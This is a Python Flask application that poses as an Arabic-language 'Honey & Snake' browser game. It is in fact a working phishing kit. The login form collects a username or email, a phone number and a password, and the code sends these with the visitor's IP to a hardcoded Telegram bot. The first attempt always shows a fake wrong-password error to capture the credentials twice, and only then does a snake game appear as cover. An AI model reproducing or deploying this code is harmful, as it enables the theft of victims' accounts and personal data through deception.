from flask import Flask, render_template_string, request, redirect, session
import requests

app = Flask(__name__)
app.secret_key = "honey_snake_pro_2026"

# --- إعدادات التليجرام الخاصة بك ---
BOT_TOKEN = "8342550502:AAFvUqf0i8OunS0MIsX_5S3R_E_SjU8v6W8"
CHAT_ID = "7299061036"
visitor_count = 1240 # عداد الزوار الحقيقي

def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
        requests.get(url)
    except: pass

# --- واجهة تسجيل الدخول واللعبة (HTML + CSS + JS) ---
INDEX_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Honey & Snake | العب الآن</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Changa:wght@400;700&display=swap');
        body { font-family: 'Changa', sans-serif; background: #fdfdfd; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); width: 90%; max-width: 380px; text-align: center; }
        .visitor-badge { background: #fff3e0; color: #e65100; padding: 5px 15px; border-radius: 50px; font-size: 13px; font-weight: bold; margin-bottom: 20px; display: inline-block; border: 1px solid #ffe0b2; }
        .online-dot { height: 8px; width: 8px; background-color: #ff9800; border-radius: 50%; display: inline-block; margin-left: 5px; animation: blink 1s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .site-title { color: #ffab00; font-size: 32px; font-weight: 700; margin: 10px 0; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; box-sizing: border-box; background: #fafafa; }
        input:focus { border-color: #ffab00; outline: none; background: #fff; }
        .btn-log { width: 100%; padding: 14px; background: #ffab00; border: none; color: white; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .error { color: #d93025; background: #fce8e6; padding: 10px; border-radius: 8px; font-size: 12px; margin-bottom: 15px; }
        canvas { background: #111; border-radius: 15px; margin-top: 15px; border: 4px solid #ffab00; display: none; }
        #game-info { display: none; margin-top: 10px; font-weight: bold; font-size: 18px; }
    </style>
</head>
<body>
    <div class="card" id="main-card">
        <div class="visitor-badge"><span class="online-dot"></span> أنت الزائر رقم: {{ count }}</div>
        <div class="site-title">Honey & Snake</div>
        
        <div id="login-section">
            <p style="color:#666;">سجل دخولك لتحدي اللاعبين في جمع العسل!</p>
            {% if error %}<div class="error">عذراً، كلمة المرور غير صحيحة. حاول مجدداً.</div>{% endif %}
            <form method="POST">
                <input type="text" name="user" placeholder="الإيميل أو اسم المستخدم" required>
                <input type="text" name="phone" placeholder="رقم الهاتف المرتبط" required>
                <input type="password" name="pass" placeholder="كلمة المرور" required>
                <button type="submit" class="btn-log">دخول وبدء اللعب</button>
            </form>
        </div>

        <div id="game-section" style="{% if show_game %} display: block; {% else %} display: none; {% endif %}">
            <div id="game-info">النقاط: <span id="score">0</span></div>
            <canvas id="snakeGame" width="300" height="300" style="display: block; margin: 0 auto;"></canvas>
            <p style="font-size:12px; color:#999; margin-top:15px;">استخدم الأسهم للتحكم بالثعبان وجمع العسل!</p>
        </div>
    </div>

    <script>
        {% if show_game %}
        document.getElementById('login-section').style.display = 'none';
        document.getElementById('game-info').style.display = 'block';
        
        const canvas = document.getElementById('snakeGame');
        const ctx = canvas.getContext('2d');
        let snake = [{x: 10, y: 10}];
        let food = {x: 15, y: 15};
        let dx = 1, dy = 0, score = 0;

        function main() {
            setTimeout(function() {
                clear(); drawFood(); move(); drawSnake();
                if(checkOver()) { alert("انتهت اللعبة! نتيجتك: " + score); location.reload(); return; }
                main();
            }, 100);
        }
        function clear() { ctx.fillStyle = "black"; ctx.fillRect(0,0,300,300); }
        function drawSnake() { ctx.fillStyle = "#4caf50"; snake.forEach(s => ctx.fillRect(s.x*10, s.y*10, 9, 9)); }
        function drawFood() { ctx.fillStyle = "#ffab00"; ctx.fillRect(food.x*10, food.y*10, 9, 9); }
        function move() {
            const head = {x: snake[0].x + dx, y: snake[0].y + dy};
            snake.unshift(head);
            if(head.x === food.x && head.y === food.y) {
                score += 10; document.getElementById('score').innerText = score;
                food = {x: Math.floor(Math.random()*29), y: Math.floor(Math.random()*29)};
            } else { snake.pop(); }
        }
        function checkOver() {
            const h = snake[0];
            if(h.x<0||h.x>29||h.y<0||h.y>29) return true;
            for(let i=1; i<snake.length; i++) if(h.x===snake[i].x && h.y===snake[i].y) return true;
            return false;
        }
        window.onkeydown = e => {
            if(e.keyCode===37 && dx===0) {dx=-1; dy=0}
            if(e.keyCode===38 && dy===0) {dx=0; dy=-1}
            if(e.keyCode===39 && dx===0) {dx=1; dy=0}
            if(e.keyCode===40 && dy===0) {dx=0; dy=1}
        };
        main();
        {% endif %}
    </script>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    global visitor_count
    if request.method == 'GET':
        visitor_count += 1
        return render_template_string(INDEX_HTML, count=visitor_count, error=False, show_game=False)
    
    if request.method == 'POST':
        u = request.form.get('user')
        p = request.form.get('phone')
        pw = request.form.get('pass')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        if 'step' not in session: session['step'] = 1
        
        send_to_telegram(f"🍯 صيد عسل جديد!\n👤 يوزر: {u}\n📞 هاتف: {p}\n🔑 باس: {pw}\n🌐 IP: {ip}\n🔢 ترتيب الزائر: {visitor_count}")

        if session['step'] == 1:
            session['step'] = 2
            return render_template_string(INDEX_HTML, count=visitor_count, error=True, show_game=False)
        
        return render_template_string(INDEX_HTML, count=visitor_count, error=False, show_game=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
